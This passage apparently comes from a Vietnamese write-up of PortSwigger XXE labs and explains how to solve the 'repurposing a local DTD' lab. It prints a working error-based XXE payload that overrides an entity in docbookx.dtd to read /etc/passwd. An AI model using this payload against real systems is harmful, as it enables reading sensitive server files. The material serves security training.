        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="email"
        
        a@ginandjuice.shop
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="website"
        
        http://a.com
        ------geckoformboundary40294791d907d871ac79c3cebe3991e--
        
        ```
        
- Thực hiện gửi request trên. Quan sát response trả về là ảnh chứa text
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2032.png)
        
    - Xem ảnh ở post 1
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2033.png)
        

![image.png](XML%20external%20entity%20(XXE)%20injection/image%2034.png)

- Hoàn thành giải lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2035.png)
    

## **Lab: Exploiting XXE to retrieve data by repurposing a local DTD**

[Lab: Exploiting XXE to retrieve data by repurposing a local DTD | Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

- Điều hướng đến chức năng **View details > Check stock**

![image.png](XML%20external%20entity%20(XXE)%20injection/image%2036.png)

![image.png](XML%20external%20entity%20(XXE)%20injection/image%2037.png)

- Trước hết, lab có parse input người dùng tại API `POST /product/stock`
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2038.png)
    
- Ở bài này vừa là blind vừa không thể dùng out of band → nhưng vẫn có error hiển thị → error based
- Thì dựa trên bài lab error based cần đọc một file sau đó thì gọi file đó trong một entity khác. Tuy nhiên, việc gọi entity này trong entity khác chỉ được phép ở file `dtd` , nếu là trong `DOCTYPE` thì không được → ở bài lab error based cần gọi file `dtd` ở ngoài mà attacker kiểm soát → remote external `dtd` file.
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2039.png)
    
- Ở bài này, chúng ta không thể gọi out of band được → không thể gọi file `dtd`  remote được. Còn file ở local thì chúng ta không tìm ra vị trí nào có thể kiểm soát và tạo file mới được trên server → chỉ có thể dùng file local.
- Nhưng chúng ta không thể sửa trực tiếp được file. Tuy nhiên, trình parser thì có. Cơ chế là khi chúng ta gọi một entity trùng tên với entity trong file `dtd` local thì entity đó sẽ overwrite và đồng thời vẫn có thể gọi entity trong một entity khác.
- Bài lab có gợi ý trong enviroment có `/usr/share/yelp/dtd/docbookx.dtd` . Mình sẽ xem trong `dtd` này có những entity nào
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2040.png)
    
- Vậy thì trước hết mình sẽ gọi file `dtd` này. Sau đó thì tạo thực thể `ISOamsa`
    
    ```jsx
    <!DOCTYPE foo [
      <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    
      <!ENTITY % ISOamsa ''>
    
      %local_dtd;
    ]>
    ```
    
- Trong phần khai báo của `ISOamsa` mình sẽ dùng lại cách khai báo và gọi thực thể của lab error based nhưng cần lưu ý về việc encode
    
    ```jsx
    <!DOCTYPE foo [
      <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    
      <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      '>
    
      %local_dtd;
    ]>
    ```
    
- Thực hiện gửi payload và đọc được file. Hoàn thành việc solve lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2041.png)